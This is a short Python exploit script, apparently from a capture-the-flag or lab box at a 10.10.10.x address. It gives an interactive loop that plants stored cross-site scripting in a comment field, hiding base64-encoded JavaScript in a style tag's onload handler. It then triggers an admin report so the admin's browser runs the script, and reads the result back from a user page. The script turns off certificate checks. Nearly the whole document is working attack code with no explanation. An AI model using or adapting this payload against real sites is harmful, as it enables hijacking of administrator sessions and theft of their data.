import requests
from base64 import b64encode, b64decode


host = '10.10.10.0'
# proxy = {'http': '127.0.0.1:8080'}

# Part 1
r = requests.get(f'https://{host}/report/1')


def send_payload(injection):
    payload = b"""<script>"""
    payload += injection
    payload += b"""</script>"""

    # XSS Payload
    payload = b64encode(payload)
    payload = payload.decode()
    comment = f"""<style onload="document.write(atob('{payload}'))"></style>"""
    data = {'comment': comment}

    # Sending XSS Payload
    r = requests.post(f'https://{host}/comment/1', data, verify=False)      # verify - ignore SSL cert

    # Making admin POST to /2
    r = requests.get(f'https://{host}/report/1')
    r = requests.get(f'https://{host}/user/2')
    output = (r.text).split('ABCD')[1]

    print(b64decode(output))

while True:
    test = input('payload> ')
    test = test.encode('utf-8')

    try:
        send_payload(test)
    except:
        print('Error')
